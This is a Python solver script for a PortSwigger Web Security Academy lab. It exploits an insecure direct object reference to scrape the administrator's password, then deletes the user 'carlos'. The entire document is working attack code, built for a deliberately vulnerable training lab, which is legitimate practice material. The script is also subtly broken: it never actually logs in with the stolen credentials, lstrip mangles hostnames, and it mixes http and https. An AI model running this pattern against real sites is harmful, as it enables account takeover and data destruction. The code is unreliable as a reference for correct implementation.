"""
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'http://{site}/login'

login_data = { 'password' : 'peter', 'username' : 'wiener'}
resp = s.post(login_url, data=login_data)

login_url = f'http://{site}/my-account?id=administrator'
resp = s.post(login_url, data=login_data)
soup = BeautifulSoup(resp.text,'html.parser')
admin_password = soup.find('input',{'name':'password'}).get('value')

login_data = { 'password' : f'{admin_password}', 'username' : 'administrator'}
url = f'https://{site}/admin'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')